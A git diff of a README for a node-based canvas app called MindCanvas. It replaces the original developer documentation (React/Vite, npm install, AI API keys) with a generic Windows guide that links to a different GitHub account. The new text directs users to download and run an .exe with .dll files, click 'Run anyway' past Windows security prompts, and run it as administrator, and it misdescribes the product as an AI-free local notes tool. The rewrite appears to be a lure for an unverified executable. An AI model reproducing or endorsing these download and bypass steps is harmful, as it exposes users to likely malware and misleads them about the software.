@@ -1,103 +1,211 @@
-# 🎨 MindCanvas: Creative Flow Engine
+# 🧠 MindCanvas - Clean Canvas for Fast Ideas
 
-> **MindCanvas** is an infinite node-based canvas focusing on "Efficiency" and "Minimalism." It is designed to strip away complex AI parameter configurations, allowing designers to focus entirely on creative inspiration. (After experiencing many mainstream or open-source infinite canvas projects and finding them somewhat lacking, I co-developed this one with Antigravity. Hope fellow creators enjoy it!)
+[![Download MindCanvas](https://img.shields.io/badge/Download-MindCanvas-blue?style=for-the-badge&logo=github)](https://github.com/Adoring-asexuality515/MindCanvas)
 
-[中文文档 (README_CN.md)](README_CN.md)
+## 🚀 Getting Started
 
----
+MindCanvas is a node-based infinite canvas app for Windows. It helps you keep your ideas in one place without a lot of setup. You can use it to sketch layouts, connect thoughts, and build a clear visual map for your work.
 
-## 🔥 Core Features
+If you want to try it now, use the main link below:
 
-- **☁️ Cloud Support**: Powered by the **BizyAir** platform, supporting high-speed cloud generation to reduce local resource consumption.
-- **🔌 Multi-Source Adaptation**: Compatible with mainstream platforms like **SiliconFlow, ModelScope, Aliyun, Volcengine**, and custom third-party API interfaces. Both paid and free interfaces are supported.
-- **🛠️ Full-Functionality**: Supports Text-to-Image, Image-to-Image, and Video generation (Future plans include AI Dubbing, Agent Skills, etc.).
-- **⚡ High Concurrency**: Supports one-click batch execution of different group tasks with infinite concurrency (depending on your API quota and tier).
-- **🖱️ Minimalist Interaction**: Double-click anywhere to add nodes; drag and drop to automatically connect and associate upstream/downstream nodes. Interaction is smooth and fluid.
+[Download MindCanvas](https://github.com/Adoring-asexuality515/MindCanvas)
 
----
+## ✨ What MindCanvas Does
 
-## 🚀 Quick Start (For Beginners)
+MindCanvas gives you a clean space to work with nodes on an endless canvas. It is built for people who want to focus on ideas, not settings.
 
-### 1. Prerequisites
-- Install [Node.js](https://nodejs.org/) (v18+ recommended).
-- Download or clone this repository to your local machine.
+You can use it to:
 
-### 2. Installation
-Open a terminal in the project root directory and run:
-```bash
-npm install
-```
+- Place notes, blocks, and idea nodes on a free canvas
+- Connect related thoughts with lines
+- Move around large maps without losing your place
+- Keep your work simple and easy to read
+- Build visual drafts for design, planning, and brainstorming
 
-### 3. Configure API Keys (Critical Step)
-MindCanvas needs to connect to cloud AI services to function. Follow these steps:
+The app keeps the layout light and direct, so you can start working with less effort.
 
-1. **Get your Keys**:
-   - **BizyAir**: Register at [BizyAir Official](https://bizyair.cn) to get your API Key.
-   - **SiliconFlow**: Get your key at [SiliconFlow](https://cloud.siliconflow.cn/i/IvfkhvET).
-   - **ModelScope**: Get your key at [ModelScope](https://www.modelscope.cn/).
-   - **Aliyun**: Get your key at [Aliyun Bailian](https://bailian.console.aliyun.com/).
-   - **Volcengine**: Get your key at [Volcengine Console](https://console.volcengine.com/).
-2. **Setup**:
-   - Open the **API Settings** interface in the top-right corner of the MindCanvas workspace.
-   - Find the corresponding platform (e.g., "BizyAir" or "SiliconFlow").
-   - Paste your key into the **"API KEY"** input field.
+## 🖥️ System Requirements
 
-### 4. Launch Project
-Enter the following command in the terminal:
-```bash
-npm run dev
-```
-Alternatively, simply double-click **`Double-Click to Start.bat`** (双击一键启动.bat). Your browser will automatically open `http://localhost:5173`.
+MindCanvas is made for Windows PCs.
 
----
+Recommended setup:
 
-## 🧩 Using BizyAir Nodes
+- Windows 10 or Windows 11
+- 64-bit system
+- 4 GB RAM or more
+- 500 MB free disk space
+- Mouse or trackpad for easy canvas control
+- A screen with at least 1366 × 768 resolution
 
-BizyAir is a core power source for MindCanvas, significantly improving generation efficiency.
+For a smoother experience, use a newer PC with more memory if you plan to work on large canvases.
 
-### Basic Usage:
-1. **Add Node**: Double-click the canvas and select nodes under the `BizyAir` menu.
-2. **Configure Converter**: Use the `BizyAir Converter` node. Copy and paste `curl` example code from the BizyAir Web App into the main text box. Set the application name (EN/CN), and it will be converted into a modular feature that `BizyAir Generator` nodes can call with one click (you can also customize which parameters to expose).
+## 📥 Download and Install
 
----
+1. Open the main download page:
+   [https://github.com/Adoring-asexuality515/MindCanvas](https://github.com/Adoring-asexuality515/MindCanvas)
 
-## 🛠️ Tech Stack
+2. On the GitHub page, look for the latest release or the latest build file.
 
-- **Frontend**: React 19 + Vite + Tailwind CSS 4
-- **Backend**: Node.js + Express (API forwarding and OSS upload)
-- **Icons**: Lucide React
+3. Download the Windows file that matches your computer.
 
----
+4. If the file is a `.zip` package, right-click it and choose Extract All.
 
-## 🤝 Contribution & Feedback
+5. Open the extracted folder.
 
-This project draws inspiration and interaction patterns from many mainstream infinite canvas projects, including but not limited to Lovart, Tapnow, Mulan, FlowMuse, Mayi Canvas, and Tapnow-Studio-PP. You may find some familiar features while using MindCanvas.
+6. Find the app file, usually named something like `MindCanvas.exe`.
 
-We are grateful to these excellent projects and to **Antigravity** for its powerful support.
+7. Double-click the file to run the app.
 
-If you have great ideas or found a bug, feel free to submit an Issue or Pull Request.
+8. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.
 
----
+## 🧭 First Launch
 
-## 🗺️ Roadmap
-- Support for Video/Audio input nodes, video parsing, and AI dubbing.
-- Batch management of history records.
-- One-click call for prompt templates.
-- Prompt case library.
-- Integration with **OpenClaw** as the "brain" (time and energy permitting).
-- Multi-Agent interaction and Skills integration.
+When you open MindCanvas for the first time, you should see a blank workspace or a simple start view.
 
----
+Basic first steps:
 
-## 💬 Community
-If you are interested in this project or have any suggestions, feel free to join our community exchange group.
+- Create a new canvas
+- Add your first node or note
+- Type a short idea into the node
+- Drag the node to a new position
+- Add another node for a related idea
+- Draw a connection between them
 
----
+This helps you get familiar with the canvas before you build a larger map.
 
-## 📄 License
+## 🎨 Main Features
 
-This project is licensed under the [Apache 2.0 License](LICENSE).
+MindCanvas focuses on a small set of tools that support fast work.
 
----
+### 🗂️ Infinite Canvas
 
-**MindCanvas - Let design return to inspiration itself.**
+You are not limited to a small page. You can keep moving across the canvas as your ideas grow.
+
+### 🔗 Node Connections
+
+Link ideas together with lines so you can see how topics relate to each other.
+
+### 🧼 Simple Interface
+
+The app avoids heavy menus and extra settings. The screen stays clear so you can focus on your work.
+
+### 📝 Fast Note Blocks
+
+Add text nodes quickly and use them as labels, reminders, or idea cards.
+
+### 🖱️ Easy Drag and Drop
+
+Move nodes where you want them. Reorder your canvas with a few mouse actions.
+
+### 🔍 Zoom and Pan
+
+Zoom in to focus on one part of your board. Zoom out to see the full picture. Pan across the canvas to move between sections.
+
+### 💾 Local Work Flow
+
+Your work stays on your computer, which makes it easy to open, edit, and continue later.
+
+## 🛠️ How to Use MindCanvas
+
+Use this simple flow for your first project:
+
+1. Open the app.
+2. Create a new board.
+3. Add a root node for your main idea.
+4. Add child nodes for subtopics.
+5. Connect related nodes.
+6. Move each node until the map is easy to read.
+7. Use color or labels to group similar ideas.
+8. Save your work when you finish.
+
+A good way to start is with one large idea, then split it into smaller parts.
+
+## 📌 Example Use Cases
+
+MindCanvas works well for many kinds of visual thinking:
+
+- Creative planning
+- Design sketches
+- Content outlines
+- Product ideas
+- Study maps
+- Project notes
+- Brainstorming sessions
+- Mind maps for teams or solo work
+
+If you think better with visual links, this app gives you a clean place to work.
+
+## 🎯 Tips for Better Results
+
+- Start with one core idea in the center
+- Keep node text short
+- Use lines only where they add meaning
+- Group related ideas near each other
+- Leave space on the canvas so the map stays easy to read
+- Save often when you make larger changes
+
+A simple board is easier to use than a crowded one.
+
+## ❓ Common Questions
+
+### Is MindCanvas hard to use?
+
+No. It is made for normal Windows users. You can start with a blank canvas and add nodes right away.
+
+### Do I need coding skills?
+
+No. You only need to download the app, open it, and use the mouse and keyboard.
+
+### Can I use it for large projects?
+
+Yes. The infinite canvas gives you room to build large idea maps, long outlines, and multi-step plans.
+
+### Does it help with creative work?
+
+Yes. It is built to keep your focus on ideas instead of tools and settings.
+
+## 📁 File Notes
+
+After download, you may see one of these file types:
+
+- `.exe` for the app itself
+- `.zip` for a compressed package
+- `.dll` files as support files
+- a folder with the app files inside
+
+If you see a package, extract it first. Then open the app file inside the folder.
+
+## 🧩 Troubleshooting
+
+### The app does not open
+
+- Check that the download finished
+- Make sure you extracted the files if the app came in a zip package
+- Try running the app as an administrator
+- Check that your Windows version is up to date
+
+### Windows blocks the file
+
+- Open the file details
+- Choose the option to run it if you trust the source
+- Make sure you downloaded it from the main GitHub page
+
+### The canvas looks too small
+
+- Use zoom to fit the view
+- Resize the window
+- Maximize the app for more space
+
+### I cannot find the app file
+
+- Open the extracted folder again
+- Look for the file with the `.exe` ending
+- Sort files by name to make it easier to spot
+
+## 🔄 Staying Up to Date
+
+Check the GitHub page from time to time for new builds or releases:
+
+[https://github.com/Adoring-asexuality515/MindCanvas](https://github.com/Adoring-asexuality515/MindCanvas)
+
+If a newer version is posted, download it again and replace the older copy on your PC.
